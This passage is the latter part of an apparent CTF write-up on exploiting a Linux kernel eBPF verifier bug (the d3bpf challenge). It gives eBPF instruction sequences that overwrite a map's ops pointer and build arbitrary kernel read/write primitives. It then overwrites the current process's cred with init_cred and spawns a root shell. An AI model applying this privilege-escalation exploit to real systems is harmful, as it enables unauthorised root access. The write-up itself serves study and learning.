<p>Now we will overwrite <code class="language-plaintext highlighter-rouge">ops</code> of <code class="language-plaintext highlighter-rouge">arb_read_write_map</code>. For this we use the <code class="language-plaintext highlighter-rouge">map_lookup_elem</code> like the previous program to make the <code class="language-plaintext highlighter-rouge">data_ptr</code> point to <code class="language-plaintext highlighter-rouge">map_ptr + 0x0</code> instead of <code class="language-plaintext highlighter-rouge">map_ptr + 0x110</code> and write <code class="language-plaintext highlighter-rouge">oob_map_ptr + 0x110</code> to <code class="language-plaintext highlighter-rouge">ops</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
<span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">arb_read_write_map_fd</span><span class="p">),</span>
<span class="n">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// get values ptr</span>

<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>

<span class="c1">// trigger vuln</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>

<span class="c1">// special instruction to load 64-bit immediates</span>
<span class="n">BPF_LD_IMM64</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">map_ptr</span> <span class="o">+</span> <span class="mh">0x110</span><span class="p">),</span> <span class="c1">// oob_map_ptr + 0x110</span>

<span class="c1">// overwrite ops with oob_map_ptr + 0x110</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>

<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
</code></pre></div></div>

<h3 id="arbitrary-read--write-program">Arbitrary Read &amp; Write program</h3>
<p>Now we will make a program which will use <code class="language-plaintext highlighter-rouge">map_lookup_elem</code> on <code class="language-plaintext highlighter-rouge">arb_read_write_map</code> to trigger <code class="language-plaintext highlighter-rouge">array_of_map_gen_lookup</code> during jitting.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>

<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
<span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">arb_read_write_map_fd</span><span class="p">),</span>
<span class="n">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span> <span class="c1">// will use array_of_map_gen_lookup</span>

<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span>
</code></pre></div></div>
<p>We will use a third map <code class="language-plaintext highlighter-rouge">info_map</code> for the communication part. We will tell the program to either do read or write using the socket. The read value will be written to <code class="language-plaintext highlighter-rouge">info_map</code> and the value to write will be taken from <code class="language-plaintext highlighter-rouge">info_map</code> also.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_LD_ABS</span><span class="p">(</span><span class="n">BPF_B</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// loads a byte from the socket</span>
<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">),</span> <span class="c1">// decide byte for arb_read or arb_write</span>

<span class="n">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_2</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">),</span>
<span class="n">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">info_map_fd</span><span class="p">),</span>
<span class="n">BPF_CALL_FUNC</span><span class="p">(</span><span class="n">BPF_FUNC_map_lookup_elem</span><span class="p">),</span>

<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JEQ</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span> <span class="c1">// 0 for read, 1 for write</span>

<span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// arb_read</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>

<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="c1">// arb_write</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>

<span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
</code></pre></div></div>
<p>I wrote two functions for each:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint64_t</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">req</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="n">arb_read_write_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>

    <span class="n">write</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>

    <span class="k">return</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">info_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">arb_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">req</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

    <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="n">arb_read_write_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
    <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="n">info_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>

    <span class="n">write</span><span class="p">(</span><span class="n">socks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>

    <span class="c1">// check if the value is written or not</span>
    <span class="c1">// used for debugging</span>
    <span class="k">return</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">info_map_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">val</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>And with that I achieved what I wanted. (sigh)<br />
Now to complete the challenge, I overwrote <code class="language-plaintext highlighter-rouge">current-&gt;cred</code> with <code class="language-plaintext highlighter-rouge">init_cred</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint64_t</span> <span class="n">current_task_struct</span> <span class="o">=</span> <span class="n">arb_read</span><span class="p">(</span><span class="n">arb_read</span><span class="p">(</span><span class="n">__per_cpu_offset</span><span class="p">)</span> <span class="o">+</span> <span class="n">current_task</span><span class="p">);</span>
<span class="kt">uint64_t</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">INIT_CRED_OFFSET</span><span class="p">;</span>

<span class="n">arb_write</span><span class="p">(</span><span class="n">current_task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">,</span> <span class="n">init_cred</span><span class="p">);</span>

<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
</code></pre></div></div>

<p>If you want to exit gracefully, you need to repair the overwritten <code class="language-plaintext highlighter-rouge">ops</code> to original value.</p>

<p>My final exploit is available <a href="https://github.com/stdnoerr/stdnoerr.github.io/tree/master/files/kernel/d3bpf">here</a>.</p>

<p>Finally I want to thank Mafred Paul, R and <a href="https://twitter.com/chompie1337">@chompie1337</a> for the amazing content about the subject.<br />
If you wanna talk, hit me up on discord <code class="language-plaintext highlighter-rouge">stdnoerr#7880</code> or twitter <a href="https://twitter.com/stdnoerr">@stdnoerr</a>.</p>

<h1 id="references">References:</h1>
<ul>
  <li><a href="https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story">https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story</a></li>
  <li><a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</a></li>
  <li><a href="https://gist.github.com/d4em0n/b0320ce8a3a930ecca1aa9d014ba79ba">https://gist.github.com/d4em0n/b0320ce8a3a930ecca1aa9d014ba79ba</a></li>
</ul>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#writeup-ref">
					writeup <span>(3)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#kernel-ref">
					kernel <span>(4)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Learning eBPF exploitation&via=stdnoerr"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c" class="img-rounded author-image" />
        <h4 class="section-title author-name">stdnoerr</h4>
        <p class="author-bio">CTFer | pwner | wanna learn everything</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/writeup/2021/09/28/HacktivityCTF2021-pawn-shop.html" title="HacktivityCTF 2021 - Pawn Shop">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/writeup/2023/11/26/BlackHat-2024-Quals-CPL0.html" title="BlackHat 2024 2024 Quals - CPL0">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2024 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'stdnoerr_blog', 'auto');
  ga('send', 'pageview');
</script>

